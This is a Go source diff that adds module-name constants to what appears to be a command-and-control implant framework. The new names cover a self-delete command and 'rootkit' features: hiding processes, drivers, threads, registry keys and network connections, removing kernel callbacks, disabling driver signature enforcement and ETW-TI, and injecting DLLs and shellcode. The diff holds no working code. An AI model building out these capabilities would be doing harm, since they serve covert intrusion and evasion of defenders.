@@ -77,10 +77,11 @@ const (
 	ModuleSetEnv               = "env_set"
 	ModuleUnsetEnv             = "env_unset"
 
-	ModuleSysInfo = "sysinfo"
-	ModuleNetstat = "netstat"
-	ModuleBypass  = "bypass"
-	ModuleRequest = "request"
+	ModuleSysInfo    = "sysinfo"
+	ModuleNetstat    = "netstat"
+	ModuleBypass     = "bypass"
+	ModuleRequest    = "request"
+	ModuleSelfDelete = "self_dele"
 
 	// module
 	ModuleListModule    = "list_module"
@@ -144,6 +145,33 @@ const (
 	ModulePtyRequest  = "pty_request"
 	ModulePtyResponse = "pty_response"
 	ModuleFFmpeg      = "ffmpeg"
+
+	// rootkit common modules
+	ModuleLinuxLkmCommon        = "linux_lkm_common"
+	ModuleWinCallbackEnumerate  = "win_callback_enumerate"
+	ModuleWinCallbackRemove     = "win_callback_remove"
+	ModuleWinCallbackRestore    = "win_callback_restore"
+	ModuleWinDriverList         = "win_driver_list"
+	ModuleWinDriverHide         = "win_driver_hide"
+	ModuleWinDriverBlock        = "win_driver_block"
+	ModuleWinInjectionDLL       = "win_injection_dll"
+	ModuleWinInjectionShellcode = "win_injection_shellcode"
+	ModuleWinMiscDSE            = "win_misc_dse"
+	ModuleWinMiscETWTI          = "win_misc_etwti"
+	ModuleWinModuleEnumerate    = "win_module_enumerate"
+	ModuleWinModuleHide         = "win_module_hide"
+	ModuleWinNetworkHide        = "win_network_hide"
+	ModuleWinProcessHide        = "win_process_hide"
+	ModuleWinProcessTerminate   = "win_process_terminate"
+	ModuleWinProcessProtection  = "win_process_protection"
+	ModuleWinProcessEnumerate   = "win_process_enumerate"
+	ModuleWinProcessSignature   = "win_process_signature"
+	ModuleWinProcessElevation   = "win_process_elevation"
+	ModuleWinRegistryProtection = "win_registry_protection"
+	ModuleWinRegistryHide       = "win_registry_hide"
+	ModuleWinThreadHide         = "win_thread_hide"
+	ModuleWinThreadProtection   = "win_thread_protection"
+	ModuleWinThreadEnumerate    = "win_thread_enumerate"
 )
 
 func SubCommandName(module string) string {
